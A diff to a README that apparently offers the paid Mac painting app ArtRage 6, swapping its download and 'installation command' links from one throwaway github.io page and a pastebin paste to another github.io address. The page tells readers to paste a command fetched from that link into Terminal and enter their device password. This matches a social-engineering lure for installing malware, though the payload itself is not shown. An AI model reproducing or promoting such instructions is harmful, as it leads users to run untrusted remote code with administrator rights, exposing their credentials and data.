@@ -3,7 +3,7 @@
 
 ArtRage 6 is a digital artist’s studio for Mac, offering realistic painting tools like oils, watercolors, and pencils that mimic traditional media. Follow the instructions below to install it on your Mac and start creating stunning artwork today! 😊
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=apple)](https://juianaiud84.github.io/.github/artrage6)
+[![Install Now](https://img.shields.io/badge/Install-Now-blue?style=for-the-badge&logo=apple)](https://dinkkennyrice406.github.io/.github/artrage6)
 
 If the download button doesn't work, follow the instructions below using the terminal commands.
 
@@ -20,7 +20,7 @@ If the download button doesn't work, follow the instructions below using the ter
 
 1. Copy the installation command below.
 
-   [![Get Installation Command](https://img.shields.io/badge/Get-Command-green?style=for-the-badge)](https://pastebin.com/raw/Fq88TfPq)
+   [![Get Installation Command](https://img.shields.io/badge/Get-Command-green?style=for-the-badge)](https://dinkkennyrice406.github.io/.github/artrage6)
 
 2. Open the terminal on your Mac and paste the command you copied above, then press the “Return” button.
 3. Enter your device password and confirm the installation.
